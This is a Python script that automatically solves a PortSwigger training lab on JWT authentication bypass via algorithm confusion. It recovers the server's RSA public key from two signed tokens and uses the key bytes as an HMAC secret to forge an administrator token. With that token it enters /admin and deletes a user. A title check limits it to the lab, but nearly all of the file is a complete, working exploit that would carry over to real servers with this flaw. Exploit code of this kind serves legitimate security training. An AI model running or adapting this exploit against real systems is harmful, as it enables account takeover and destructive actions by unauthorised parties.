#!/usr/bin/env python3
"""
Autonomous solver: PortSwigger EXPERT lab
"JWT authentication bypass via algorithm confusion with no exposed key"

Objective
---------
1. Log in as wiener (wiener:peter) and collect two server-signed RS256 JWTs.
2. Recover the server's RSA public modulus `n` from the two (message, signature)
   pairs (the rsa_sign2n technique: G = gcd(s1^e - m1, s2^e - m2), then n is a
   small-cofactor divisor of G).
3. Rebuild the public key as X.509 / PKCS1 PEM variants and use the PEM bytes as
   the HS256 HMAC secret (algorithm confusion: the server verifies HS256 tokens
   with the *key file contents* as the HMAC key).
4. Forge a token with sub=administrator, enter /admin, delete user carlos.
5. Verify the lab status widget flips to solved.

Nothing instance-specific is hardcoded: the lab URL comes from --url, the kid,
payload fields, delete URL, and key material are all discovered at runtime.

Exit codes: 0 = verified success, 2 = identity/argument error, 1 = failure.
"""
from __future__ import annotations

import argparse
import base64
import ctypes
import ctypes.util
import hashlib
import hmac
import json
import re
import sys
import time
from dataclasses import dataclass, field

try:
    import requests
except ImportError:  # pragma: no cover
    print("ERROR: the 'requests' package is required (uv run installs it).", file=sys.stderr)
    sys.exit(2)

TITLE_MARKER = "jwt authentication bypass via algorithm confusion"
UA = "Mozilla/5.0 (PortSwigger Labs Solver)"
LOGIN_USERNAME = "wiener"
LOGIN_PASSWORD = "peter"
TARGET_USER = "carlos"


# ---------------------------------------------------------------------------
# Bignum layer: gmpy2 (if installed) -> ctypes libgmp -> pure Python fallback.
# The hot path is s^65537 on a 2048-bit int (134M-bit result) plus a GCD of two
# such numbers; CPython's O(n^2) longs make that minutes, GMP makes it ms.
# ---------------------------------------------------------------------------
class Gmpy2:
    name = "gmpy2"

    def __init__(self):
        import gmpy2
        self._g = gmpy2
        self._gmpy2 = gmpy2

    def pow(self, a: int, e: int) -> int:
        return int(self._g.pow(a, e))

    def gcd(self, a: int, b: int) -> int:
        return int(self._g.gcd(a, b))

    def powm(self, a: int, e: int, m: int) -> int:
        return int(self._g.modpow(a, e, m))


class CtypesGmp:
    """Fast bignum ops via ctypes against libgmp.so (GMP 5/6/7)."""
    name = "ctypes-libgmp"

    _CANDIDATES = [
        "libgmp.so.10", "libgmp.so",
        "/usr/lib/aarch64-linux-gnu/libgmp.so.10",
        "/usr/lib/x86_64-linux-gnu/libgmp.so.10",
        "/usr/lib/libgmp.so.10",
        "/usr/lib64/libgmp.so.10",
        "/usr/local/lib/libgmp.so.10",
        "/opt/homebrew/lib/libgmp.10.dylib",
        "/opt/homebrew/lib/libgmp.dylib",
        ctypes.util.find_library("gmp") or "",
    ]

    def __init__(self):
        last = None
        self.lib = None
        for name in self._CANDIDATES:
            if not name:
                continue
            try:
                self.lib = ctypes.CDLL(name)
                break
            except OSError as e:
                last = e
        if self.lib is None:
            raise OSError(f"could not load libgmp: {last}")
        self._check_symbols()
        self._setup_argtypes()

    def _check_symbols(self):
        for fname in ("__gmpz_init", "__gmpz_clear", "__gmpz_set_str",
                      "__gmpz_pow_ui", "__gmpz_sub", "__gmpz_gcd",
                      "__gmpz_mod", "__gmpz_cmp", "__gmpz_set_ui",
                      "__gmpz_sizeinbase", "__gmpz_export"):
            getattr(self.lib, fname)

    def _setup_argtypes(self):
        class mpz_struct(ctypes.Structure):
            _fields_ = [("_mp_alloc", ctypes.c_int),
                        ("_mp_size", ctypes.c_int),
                        ("_mp_d", ctypes.c_void_p)]
        P = ctypes.POINTER(mpz_struct)
        self._MPZ = mpz_struct
        lib = self.lib
        # Note: getattr with explicit strings — attribute access to lib.__gmpz_*
        # inside a class body would be mangled to lib._CtypesGmp__gmpz_*.
        f = {n: getattr(lib, n) for n in ("__gmpz_init", "__gmpz_clear",
                                          "__gmpz_set_str", "__gmpz_pow_ui",
                                          "__gmpz_sub", "__gmpz_gcd",
                                          "__gmpz_mod", "__gmpz_cmp",
                                          "__gmpz_set_ui", "__gmpz_sizeinbase",
                                          "__gmpz_export")}
        self._f = f
        f["__gmpz_init"].argtypes = [P]
        f["__gmpz_clear"].argtypes = [P]
        f["__gmpz_set_str"].restype = ctypes.c_int
        f["__gmpz_set_str"].argtypes = [P, ctypes.c_char_p, ctypes.c_int]
        f["__gmpz_pow_ui"].argtypes = [P, P, ctypes.c_ulong]
        f["__gmpz_sub"].argtypes = [P, P, P]
        f["__gmpz_gcd"].argtypes = [P, P, P]
        f["__gmpz_mod"].argtypes = [P, P, P]
        f["__gmpz_cmp"].argtypes = [P, P]
        f["__gmpz_set_ui"].argtypes = [P, ctypes.c_ulong]
        f["__gmpz_sizeinbase"].argtypes = [P, ctypes.c_int]
        f["__gmpz_sizeinbase"].restype = ctypes.c_size_t
        f["__gmpz_export"].restype = ctypes.c_void_p
        f["__gmpz_export"].argtypes = [ctypes.c_void_p,
                                       ctypes.POINTER(ctypes.c_size_t),
                                       ctypes.c_int, ctypes.c_size_t,
                                       ctypes.c_int, ctypes.c_size_t, P]

    def _new(self, value: int):
        s = self._MPZ()
        self._f["__gmpz_init"](s)
        if value < (1 << 64):
            self._f["__gmpz_set_ui"](s, ctypes.c_ulong(value))
        else:
            r = self._f["__gmpz_set_str"](s, format(value, "x").encode(), 16)
            if r != 0:
                raise ValueError("mpz_set_str failed")
        return s

    def _to_int(self, s) -> int:
        n_bytes = max(1, (self._f["__gmpz_sizeinbase"](s, 2) + 7) // 8)
        buf = ctypes.create_string_buffer(n_bytes)
        rsize = ctypes.c_size_t()
        self._f["__gmpz_export"](buf, ctypes.byref(rsize), 1, 1, 1, 0, s)
        data = buf.raw[:rsize.value] or b"\x00"
        return int.from_bytes(data, "big")

    def pow(self, a: int, e: int) -> int:
        r, b = self._new(0), self._new(a)
        self._f["__gmpz_pow_ui"](r, b, ctypes.c_ulong(e))
        return self._to_int(r)

    def gcd(self, a: int, b: int) -> int:
        r, x, y = self._new(0), self._new(a), self._new(b)
        self._f["__gmpz_gcd"](r, x, y)
        return self._to_int(r)


class PurePython:
    name = "pure-python"

    def pow(self, a: int, e: int) -> int:
        return pow(a, e)

    def gcd(self, a: int, b: int) -> int:
        import math
        return math.gcd(a, b)


def make_bignum():
    for cls in (Gmpy2, CtypesGmp):
        try:
            return cls()
        except Exception:
            continue
    return PurePython()


# ---------------------------------------------------------------------------
# RSA / JWT helpers
# ---------------------------------------------------------------------------
DIGEST_INFO_SHA256 = bytes.fromhex("3031300d060960864801650304020105000420")


def b64u_enc(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")


def b64u_dec(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def emsa_pkcs1_v15_sha256(signing_input: bytes, k: int) -> int:
    """Reconstruct the EMSA-PKCS1-v1_5 encoded message for an RS256 signature."""
    digest = hashlib.sha256(signing_input).digest()
    t = DIGEST_INFO_SHA256 + digest
    if k < len(t) + 11:
        raise ValueError("signature too short for RSA/SHA256")
    em = b"\x00\x01" + b"\xff" * (k - len(t) - 3) + b"\x00" + t
    return int.from_bytes(em, "big")


def der_len(n: int) -> bytes:
    if n < 0x80:
        return bytes([n])
    b = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(b)]) + b


def der_int(x: int) -> bytes:
    b = x.to_bytes((x.bit_length() + 7) // 8, "big")
    if b[0] & 0x80:
        b = b"\x00" + b
    return b"\x02" + der_len(len(b)) + b


def pkcs1_der(n: int, e: int) -> bytes:
    inner = der_int(n) + der_int(e)
    return b"\x30" + der_len(len(inner)) + inner


def x509_spki_der(n: int, e: int) -> bytes:
    algid = b"\x30\x0d\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x01\x05\x00"
    bits = b"\x03" + der_len(len(pkcs1_der(n, e)) + 1) + b"\x00" + pkcs1_der(n, e)
    inner = algid + bits
    return b"\x30" + der_len(len(inner)) + inner


def der2pem(der: bytes, token: str, width: int = 64, trailing_nl: bool = True) -> bytes:
    b64 = base64.b64encode(der).decode("ascii")
    lines = [b64[i:i + width] for i in range(0, len(b64), width)]
    body = ("-----BEGIN %s-----\n%s\n-----END %s-----" % (token, "\n".join(lines), token))
    if trailing_nl:
        body += "\n"
    return body.encode("ascii")


def pem_variants(n: int, e: int):
    """Candidate encodings of the server's local key file (HMAC key bytes).

    The lab hint says the server stores the public key as an X.509 PEM file,
    but we try the plausible byte-exact variants so the solver is robust.
    """
    x509 = x509_spki_der(n, e)
    pkcs1 = pkcs1_der(n, e)
    return [
        ("x509_nl64", der2pem(x509, "PUBLIC KEY", 64, True)),
        ("x509_nonl", der2pem(x509, "PUBLIC KEY", 64, False)),
        ("x509_nl60", der2pem(x509, "PUBLIC KEY", 60, True)),
        ("pkcs1_nl", der2pem(pkcs1, "RSA PUBLIC KEY", 64, True)),
        ("pkcs1_nonl", der2pem(pkcs1, "RSA PUBLIC KEY", 64, False)),
    ]


def forge_hs256_token(orig_token: str, key: bytes, payload_overrides: dict | None = None,
                      exp: int | None = None) -> str:
    """Re-sign a server JWT with HS256 using `key` as the HMAC secret.

    Mirrors rsa_sign2n's forge_mac: header bytes get RS256->HS256 replaced in
    place (preserving kid and JSON formatting); payload keeps all original
    claims (iss, ...) with exp refreshed and optional overrides (sub=...).
    """
    h, p, _ = orig_token.split(".")
    header_tampered = b64u_enc(b64u_dec(h).replace(b"RS256", b"HS256"))
    payload = json.loads(b64u_dec(p))
    payload["exp"] = exp if exp is not None else int(time.time()) + 86400
    if payload_overrides:
        payload.update(payload_overrides)
    payload_enc = b64u_enc(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    mac = hmac.new(key, b".".join([header_tampered.encode(), payload_enc.encode()]),
                   hashlib.sha256).digest()
    return ".".join([header_tampered, payload_enc, b64u_enc(mac)])


def derive_modulus_candidates(bn, tokens: list[str]):
    """Recover candidate RSA moduli from two RS256-signed JWTs.

    Returns a list of (e, cofactor, n) candidates, sorted by (e, cofactor).
    """
    sig_ints, msg_ints = [], []
    for tok in tokens:
        h, p, sig = tok.split(".")
        k = len(b64u_dec(sig))
        sig_ints.append(int.from_bytes(b64u_dec(sig), "big"))
        msg_ints.append(emsa_pkcs1_v15_sha256(f"{h}.{p}".encode("ascii"), k))

    candidates = []
    for e in (65537, 3):
        t0 = time.time()
        C0 = bn.pow(sig_ints[0], e) - msg_ints[0]
        C1 = bn.pow(sig_ints[1], e) - msg_ints[1]
        G = bn.gcd(C0, C1)
        print(f"[derive] e={e}: gcd bits={G.bit_length()} "
              f"({time.time() - t0:.2f}s)", flush=True)
        for c in range(1, 100001):
            if G % c != 0:
                continue
            n = G // c
            if not (512 <= n.bit_length() <= 8192):
                continue
            # exact check: n must actually divide both s^e - m
            if pow(sig_ints[0], e, n) == msg_ints[0] % n and \
               pow(sig_ints[1], e, n) == msg_ints[1] % n:
                candidates.append((e, c, n))
                print(f"[derive]   candidate: e={e} cofactor={c} "
                      f"n bits={n.bit_length()}", flush=True)
    # de-dup
    seen = set()
    uniq = []
    for e, c, n in candidates:
        if (e, n) not in seen:
            seen.add((e, n))
            uniq.append((e, c, n))
    return uniq


# ---------------------------------------------------------------------------
# HTTP client with request counting + evidence capture
# ---------------------------------------------------------------------------
@dataclass
class Client:
    base: str
    out_dir: str | None = None
    request_count: int = 0
    saved: list = field(default_factory=list)

    def make_session(self):
        s = requests.Session()
        s.headers.update({"User-Agent": UA})
        return s

    def call(self, session, method, path, **kw):
        url = path if str(path).startswith(("http://", "https://")) else self.base + path
        kw.setdefault("timeout", 30)
        last_err = None
        for attempt in range(4):
            self.request_count += 1
            try:
                r = session.request(method, url, **kw)
                last_err = None
                break
            except (requests.exceptions.ConnectionError,
                    requests.exceptions.Timeout,
                    requests.exceptions.ChunkedEncodingError) as e:
                last_err = e
                wait = 2.0 * (attempt + 1)
                print(f"[net] transient error on {method} {path} "
                      f"({type(e).__name__}); retrying in {wait:.0f}s "
                      f"(attempt {attempt + 1}/4)", flush=True)
                time.sleep(wait)
        if last_err is not None:
            raise last_err
        if self.out_dir:
            tag_path = path if str(path).startswith(("http://", "https://")) else path
            tag = f"{self.request_count:02d}_{method.lower()}_{str(tag_path).strip('/').replace('/', '_')[:60] or 'root'}"
            try:
                with open(f"{self.out_dir}/requests/{tag}.req", "w") as f:
                    f.write(f"{method} {url}\n")
                    f.write(f"headers: {json.dumps(kw.get('headers', {}), indent=1)}\n")
                    if kw.get("data"):
                        f.write(f"body: {kw['data']}\n")
                with open(f"{self.out_dir}/responses/{tag}.resp", "wb") as f:
                    f.write(f"HTTP {r.status_code}\n".encode())
                    f.write(f"headers: {json.dumps(dict(r.headers), indent=1)}\n\n".encode())
                    f.write(r.content)
                self.saved.append(tag)
            except OSError:
                pass
        return r


def lab_status(html_text: str) -> str:
    m = re.search(r"widgetcontainer-lab-status\s+(is-solved|is-notsolved)", html_text)
    if m:
        return "solved" if m.group(1) == "is-solved" else "not-solved"
    if re.search(r"<p>\s*Solved\s*</p>", html_text):
        return "solved"
    return "unknown"


# ---------------------------------------------------------------------------
# Solve flow
# ---------------------------------------------------------------------------
def solve(url: str, out_dir: str | None, allow_mismatch: bool) -> int:
    t_start = time.time()
    url = url.rstrip("/")
    c = Client(base=url, out_dir=out_dir)

    # 1. identity guard ------------------------------------------------------
    s0 = c.make_session()
    r = c.call(s0, "GET", "/")
    title_m = re.search(r"<title[^>]*>(.*?)</title>", r.text, re.S | re.I)
    title = re.sub(r"\s+", " ", title_m.group(1)).strip() if title_m else ""
    print(f"[guard] HTTP {r.status_code} | title: {title!r}")
    if r.status_code != 200:
        print(f"[guard] ERROR: lab not serving (HTTP {r.status_code}); instance may be expired.")
        return 1
    if TITLE_MARKER not in title.lower() and not allow_mismatch:
        print(f"[guard] ERROR: title does not match the expected lab "
              f"({TITLE_MARKER!r}); refusing to run (use --allow-mismatch to override).")
        return 2
    initial_status = lab_status(r.text)
    print(f"[guard] initial status: {initial_status}")

    # 2. login twice for two distinct RS256 signatures ------------------------
    tokens = []
    for i in range(2):
        s = c.make_session()
        rr = c.call(s, "GET", "/login")
        m = re.search(r'name="csrf" value="([^"]+)"', rr.text)
        if not m:
            print("[login] ERROR: no CSRF token on /login page")
            return 1
        csrf = m.group(1)
        rr = c.call(s, "POST", "/login",
                    data={"csrf": csrf, "username": LOGIN_USERNAME, "password": LOGIN_PASSWORD},
                    headers={"Referer": url + "/login",
                             "Content-Type": "application/x-www-form-urlencoded"},
                    allow_redirects=False)
        tok = s.cookies.get("session")
        if rr.status_code not in (302, 303) or not tok or tok.count(".") != 2:
            print(f"[login] ERROR: login attempt {i + 1} failed "
                  f"(HTTP {rr.status_code}); body: {rr.text[:200]!r}")
            return 1
        hd = json.loads(b64u_dec(tok.split(".")[0]))
        if hd.get("alg", "").upper().startswith("RS") is False:
            print(f"[login] ERROR: session JWT alg is {hd.get('alg')!r}, expected RS*")
            return 1
        tokens.append(tok)
        print(f"[login] attempt {i + 1}: {LOGIN_USERNAME} -> HTTP {rr.status_code}, "
              f"JWT kid={hd.get('kid')} alg={hd.get('alg')} sub-claim present")
        with open((out_dir or ".") + f"/responses/login{i + 1}_jwt.txt", "w") as f:
            f.write(tok + "\n")

    if len({tokens[0].split('.')[2], tokens[1].split('.')[2]}) < 2:
        # identical signatures would make sign2n impossible; force a fresh one
        print("[login] signatures identical; re-logging in once more")
        s = c.make_session()
        rr = c.call(s, "GET", "/login")
        csrf = re.search(r'name="csrf" value="([^"]+)"', rr.text).group(1)
        rr = c.call(s, "POST", "/login",
                    data={"csrf": csrf, "username": LOGIN_USERNAME, "password": LOGIN_PASSWORD},
                    headers={"Referer": url + "/login"}, allow_redirects=False)
        tok = s.cookies.get("session")
        if not tok or tokens[-1].split(".")[2] == tok.split(".")[2]:
            print("[login] ERROR: could not obtain a distinct second signature")
            return 1
        tokens[-1] = tok

    # 3. recover the modulus ---------------------------------------------------
    bn = make_bignum()
    print(f"[derive] bignum backend: {bn.name}")
    candidates = derive_modulus_candidates(bn, tokens)
    if not candidates:
        print("[derive] ERROR: no candidate modulus recovered (both e=65537 and e=3).")
        return 1
    (e0, c0, n0) = candidates[0]
    print(f"[derive] best candidate: e={e0} cofactor={c0} n bits={n0.bit_length()}")
    with open((out_dir or ".") + "/responses/derived_n.txt", "w") as f:
        for e, cf, n in candidates:
            f.write(f"e={e} cofactor={cf} n={n:x}\n")

    # 4. find the PEM variant the server accepts --------------------------------
    # Two passes: first the documented format (lab hint: the key is stored as an
    # X.509 PEM) across all candidates — cheapest on the common path; then every
    # other byte-exact variant if none was accepted.
    s_test = c.make_session()
    winner = None
    label_pems = {}
    for e, cf, n in candidates:
        for label, pem in pem_variants(n, e):
            label_pems[(e, n, label)] = pem
    all_labels = [l for (l, _) in pem_variants(1, 65537)]  # canonical label order
    passes = [["x509_nl64"], [l for l in all_labels if l != "x509_nl64"]]
    for labels in passes:
        for e, cf, n in candidates:
            for label in labels:
                pem = label_pems[(e, n, label)]
                tok = forge_hs256_token(tokens[0], pem)
                rr = c.call(s_test, "GET", "/my-account",
                            cookies={"session": tok}, allow_redirects=False)
                accepted = rr.status_code == 200
                print(f"[keytest] e={e} cofactor={cf} {label}: HTTP {rr.status_code} "
                      f"{'ACCEPTED' if accepted else 'rejected'}", flush=True)
                if accepted:
                    winner = (e, cf, n, label, pem)
                    with open((out_dir or ".") + f"/responses/winning_key_{label}.pem", "wb") as f:
                        f.write(pem)
                    with open((out_dir or ".") + "/responses/winning_token.txt", "w") as f:
                        f.write(tok + "\n")
                    break
            if winner:
                break
        if winner:
            break
    if not winner:
        print("[keytest] ERROR: no PEM variant accepted by the server.")
        return 1
    e_w, c_w, n_w, label_w, pem_w = winner
    print(f"[keytest] winner: e={e_w} cofactor={c_w} variant={label_w}")

    # 5. admin: forge sub=administrator, enter /admin ---------------------------
    admin_tok = forge_hs256_token(tokens[0], pem_w, payload_overrides={"sub": "administrator"})
    with open((out_dir or ".") + "/responses/admin_token.txt", "w") as f:
        f.write(admin_tok + "\n")
    s_admin = c.make_session()
    # NOTE: the forged JWT must live in the session jar — /admin/delete is a
    # follow-up request that needs the same (valid) session.
    s_admin.cookies.set("session", admin_tok)
    rr = c.call(s_admin, "GET", "/admin", allow_redirects=False)
    print(f"[admin] GET /admin as administrator: HTTP {rr.status_code}")
    if rr.status_code != 200:
        print(f"[admin] ERROR: admin panel not reached; body: {rr.text[:300]!r}")
        return 1
    with open((out_dir or ".") + "/responses/admin_panel.html", "wb") as f:
        f.write(rr.content)

    # 6. delete the target user (skip if a previous run already removed him) ----
    if TARGET_USER in rr.text:
        # discover the delete link for the target user
        links = re.findall(r'<a[^>]+href="([^"]+)"[^>]*>(.*?)</a>', rr.text, re.S)
        delete_url = None
        for href, text in links:
            if TARGET_USER in text or (TARGET_USER in href and "delete" in href.lower()):
                delete_url = href
                break
        if delete_url is None:  # fallback: the documented query endpoint
            delete_url = "/admin/delete?username=" + TARGET_USER
        delete_url = delete_url if delete_url.startswith("http") else url + delete_url
        print(f"[admin] delete endpoint: {delete_url}")
        rr = c.call(s_admin, "GET", delete_url, allow_redirects=False)
        print(f"[admin] delete result: HTTP {rr.status_code}")
        with open((out_dir or ".") + "/responses/delete_result.html", "wb") as f:
            f.write(rr.content)
        if rr.status_code >= 400:
            print(f"[admin] ERROR: delete request failed; body: {rr.text[:300]!r}")
            return 1
    else:
        print(f"[admin] user {TARGET_USER!r} is not listed — already deleted "
              f"(initial status was {initial_status}); skipping delete.")

    # 7. verify the solved state (authoritative: page status widget) -----------
    time.sleep(1.0)
    s_v = c.make_session()
    rr = c.call(s_v, "GET", "/")
    status = lab_status(rr.text)
    print(f"[verify] lab status widget: {status}")
    with open((out_dir or ".") + "/responses/final_status.html", "wb") as f:
        f.write(rr.content)
    # double-check: carlos really gone from the admin panel (refresh the admin
    # session first — the delete action may have rotated/cleared the cookie)
    s_admin.cookies.set("session",
                        forge_hs256_token(tokens[0], pem_w, payload_overrides={"sub": "administrator"}))
    rr = c.call(s_admin, "GET", "/admin", allow_redirects=False)
    carlos_gone = rr.status_code == 200 and TARGET_USER not in rr.text
    print(f"[verify] {TARGET_USER} still listed on /admin: {not carlos_gone}")
    with open((out_dir or ".") + "/responses/admin_panel_after.html", "wb") as f:
        f.write(rr.content)

    dt = time.time() - t_start
    print(f"[done] status={status} carlos_gone={carlos_gone} "
          f"requests={c.request_count} time={dt:.1f}s")
    if status == "solved" and carlos_gone:
        print("[done] SUCCESS: lab verified as solved.")
        return 0
    print("[done] FAILURE: completion not verified.")
    return 1


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[1])
    ap.add_argument("--url", required=True, help="Full lab URL")
    ap.add_argument("--out", default=None,
                    help="Evidence output directory (defaults to <script dir>/evidence)")
    ap.add_argument("--allow-mismatch", action="store_true",
                    help="Run even if the page title does not match this lab")
    args = ap.parse_args()

    out_dir = args.out
    if out_dir is None:
        import os
        out_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "evidence")
    import os
    for sub in ("requests", "responses"):
        os.makedirs(os.path.join(out_dir, sub), exist_ok=True)

    try:
        return solve(args.url, out_dir, args.allow_mismatch)
    except requests.exceptions.RequestException as e:
        print(f"[fatal] network error: {e}")
        return 1


if __name__ == "__main__":
    sys.exit(main())
